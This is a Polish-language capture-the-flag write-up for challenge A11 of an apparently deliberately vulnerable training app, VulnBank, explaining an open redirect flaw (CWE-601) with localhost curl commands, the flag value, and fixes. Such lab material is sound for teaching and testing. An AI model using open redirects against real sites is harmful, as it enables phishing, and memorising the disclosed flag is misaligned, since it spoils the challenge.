# A11 - Open Redirect

## Metadane
- **ID:** A11
- **Kategoria:** CWE-601 - URL Redirection to Untrusted Site
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{open_r3d1rect_phi1sh1ng_v3ct0r}`

## Opis
Endpoint `/api/challenges/a11/redirect?next=` wykonuje przekierowanie na adres
podany przez użytkownika bez walidacji. Atakujący może przygotować link wyglądający
jak zaufany adres VulnBanku, który finalnie prowadzi do kontrolowanej lokalizacji.

W tym zadaniu flaga jest dostępna po użyciu podatnego endpointu przekierowania.
Endpoint `/api/challenges/a11/flag` sprawdza cookie ustawione przez redirect.

## Podatny endpoint
```
GET /api/challenges/a11/redirect?next=
```

## Exploit krok po kroku
1. Wywołaj redirect z parametrem `next=/api/challenges/a11/flag`.
2. Zachowaj cookie ustawione przez odpowiedź redirectu.
3. Wejdź na `/api/challenges/a11/flag` z tym cookie.

```bash
curl -c cookies.txt -L \
  "http://localhost:5000/api/challenges/a11/redirect?next=/api/challenges/a11/flag"

curl -b cookies.txt http://localhost:5000/api/challenges/a11/flag
```

W odpowiedzi znajdziesz:
```json
{
  "flag": "PWR{open_r3d1rect_phi1sh1ng_v3ct0r}"
}
```

## Jak to naprawić
- Akceptuj tylko lokalne ścieżki albo adresy z whitelisty
- Odrzucaj pełne URL-e prowadzące na zewnętrzne domeny
- Unikaj przekierowań opartych bezpośrednio na parametrach użytkownika

## Referencje
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
